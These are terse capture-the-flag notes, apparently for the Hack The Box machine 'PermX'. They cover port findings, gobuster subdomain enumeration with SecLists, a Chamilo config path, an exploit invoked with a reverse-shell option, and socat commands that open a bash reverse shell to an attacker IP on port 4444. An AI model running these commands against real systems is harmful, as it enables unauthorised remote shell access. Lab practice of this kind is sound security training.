- port 22, 80
- runs php

- http://permx.htb/lib/waypoints/links.php

```bash
cd /usr/share
sudo git clone https://github.com/danielmiessler/SecLists.git

gobuster dns -d permx.htb -w /usr/share/SecLists/Discovery/DNS/dns-Jhaddix.txt -t 50

gobuster dns -d permx.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt


/var/www/chamilo/app/config/configuration.php
python3 main.py  -u http://lms.permx.htb/ -a revshell


socat file:`tty`,raw,echo=0 tcp-listen:4444

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.167:4444

```